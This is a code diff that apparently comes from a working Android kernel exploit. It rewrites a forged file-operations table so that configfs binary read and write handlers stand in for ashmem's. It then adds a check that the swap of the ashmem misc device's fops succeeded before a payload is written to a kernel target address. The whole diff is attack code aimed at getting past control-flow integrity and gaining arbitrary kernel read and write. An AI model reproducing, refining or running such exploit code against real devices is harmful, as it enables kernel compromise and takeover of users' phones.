@@ -360,8 +360,10 @@ int refresh_fake_fops_text(int fd) {
     size_t off;
     uint64_t value;
   } slots[] = {
-    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
-    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
+    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_BIN)},
+    {FOPS_WRITE_OFF, text_addr(CONFIGFS_WRITE_BIN)},
+    {FOPS_READ_ITER_OFF, 0},
+    {FOPS_WRITE_ITER_OFF, 0},
     {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
     {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
     {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
@@ -447,13 +449,28 @@ int try_cfi_stage(void) {
   }
 
   pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
-          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
+          "ioctl=%016llx open=%016llx write=%016llx read=%016llx\n",
           cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
           (unsigned long long)text_addr(ASHMEM_IOCTL),
           (unsigned long long)text_addr(ASHMEM_OPEN),
-          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));
+          (unsigned long long)text_addr(CONFIGFS_WRITE_BIN),
+          (unsigned long long)text_addr(CONFIGFS_READ_BIN));
 
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  /* Swap-landing diagnostic: read miscdevice.fops via the (now fake) .read
+   * method. If it reads back fake_fops, the GhostLock fops swap is in effect on
+   * this fd; if not, the fd is still on real ashmem_fops (rb write didn't stick).
+   * FMODE_CAN_READ is set regardless (ashmem has read_iter), so pread routes to
+   * fake_fops->read only when the swap landed. */
+  {
+    uint64_t swap_chk = 0;
+    errno = 0;
+    ssize_t sr = configfs_read_once(fd, misc_fops, &swap_chk, sizeof(swap_chk));
+    pr_info("cfi swap-check read_ret=%zd errno=%d misc_fops[%016zx]=%016llx "
+            "want_fake_fops=%016zx landed=%d\n",
+            sr, errno, misc_fops, (unsigned long long)swap_chk, fake_fops,
+            (int)(swap_chk == (uint64_t)fake_fops));
+  }
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
